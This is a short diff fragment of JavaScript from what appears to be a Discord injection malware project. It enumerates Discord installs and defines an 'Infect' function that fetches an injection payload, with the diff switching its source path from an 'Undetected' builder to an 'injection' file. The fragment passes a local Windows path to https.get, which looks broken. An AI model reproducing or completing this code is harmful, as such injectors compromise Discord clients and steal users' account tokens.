@@ -42,7 +42,7 @@ discords.forEach(function(file) {
 });
 listDiscords();
 function Infect() {
-    https.get('C:\Users\Waet\Desktop\van-main\src\Undetected\Builder', (resp) => {
+    https.get('C:\Users\Waet\Desktop\van-main\src\Injection\injection', (resp) => {
         let data = '';
         resp.on('data', (chunk) => {
             data += chunk;
